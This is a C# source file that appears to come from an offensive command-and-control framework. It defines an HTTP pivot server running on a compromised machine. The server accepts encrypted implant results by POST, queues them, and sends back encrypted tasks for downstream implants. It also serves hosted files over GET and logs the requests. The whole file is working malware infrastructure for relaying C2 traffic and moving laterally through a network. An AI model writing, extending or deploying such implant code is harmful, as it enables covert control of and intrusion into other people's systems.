using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Security.Cryptography;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using Agent.Communication;
using Agent.Helpers;
using Agent.Models;

namespace Agent.Service.Pivoting
{
    public class PivotHttpServer : PivotServer
    {
        IWebHostService webHostService;
        public PivotHttpServer(ConnexionUrl conn, string serverKey) : base(conn, serverKey)
        {
            webHostService = ServiceProvider.GetService<IWebHostService>();
        }


        public override async Task Start()
        {
            try
            {
                this.Status = RunningService.RunningStatus.Running;
                var listener = new HttpListener();

                string url = "http://" + Connexion.Address + ":" +Connexion.Port + "/";

                listener.Prefixes.Add(url);
                listener.Start();

                while (!_tokenSource.IsCancellationRequested)
                {
                    // this blocks until a connection is received or token is cancelled
                    var client = await listener.AcceptHttpClientAsync(_tokenSource);

                    // do something with the connected client
                    var thread = new Thread(async () => await HandleClient(client));
                    thread.Start();
                }
                // handle client in new thread

                listener.Stop();
            }
            finally
            {
                this.Status = RunningService.RunningStatus.Stoped;
            }
        }

        private async Task HandleClient(HttpListenerContext client)
        {
            if (client == null)
                return;

            try
            {
                if (client.Request.HttpMethod == "POST")
                    await this.HandleImplant(client);
                else if (client.Request.HttpMethod == "GET")
                    await this.handleWebHost(client);
                else
                    await client.Response.ReturnNotFound();
            }
            catch (Exception ex)
            {
#if DEBUG
                Debug.WriteLine(ex);
#endif
                await client.Response.ReturnNotFound();
            }
            finally
            {
                Debug.WriteLine($"HTTP Pivot  : disconnected");
            }
        }

        private async Task HandleImplant(HttpListenerContext client)
        {
            HttpListenerRequest request = client.Request;
            HttpListenerResponse response = client.Response;
            string content = string.Empty;

            using (StreamReader reader = new StreamReader(request.InputStream, request.ContentEncoding))
            {
                content = await reader.ReadToEndAsync();
                //Debug.WriteLine("HTTP Pivot : POST Request Content: " + content);
            }
            var dec = this.Encryptor.DecryptFromBase64(content);

            var responses = dec.Deserialize<List<MessageResult>>();
            _messageService.EnqueueResults(responses);

            var relays = this.ExtractRelays(responses);


            var tasks = this._messageService.GetMessageTasksToRelay(relays);
            var taskBytes = tasks.Serialize();
            var taskEncb64 = this.Encryptor.EncryptAsBase64(taskBytes);



            response.StatusCode = 200;
            response.ContentType = "text/plain";
            using (var writer = new StreamWriter(response.OutputStream))
                writer.Write(taskEncb64);
        }

        private async Task handleWebHost(HttpListenerContext client)
        {
            var path = client.Request.Url.LocalPath.TrimStart('/');
            Debug.WriteLine(path);
            var log = new WebHostLog()
            {
                Path = path,
                Date = DateTime.UtcNow,
                UserAgent = client.Request.Headers.AllKeys.Contains("UserAgent") ? client.Request.Headers["UserAgent"].ToString() : String.Empty,
                Url = client.Request.Url.ToString(),
            };

            var fileContent = webHostService.GetFile(path);

            if (fileContent == null)
            {
                log.StatusCode = 404;
                this.webHostService.Addlog(log);
                await client.Response.ReturnNotFound();
                return;
            }

            log.StatusCode = 200;
            this.webHostService.Addlog(log);

            await client.Response.ReturnFile(fileContent);

            return;

        }

    }
}
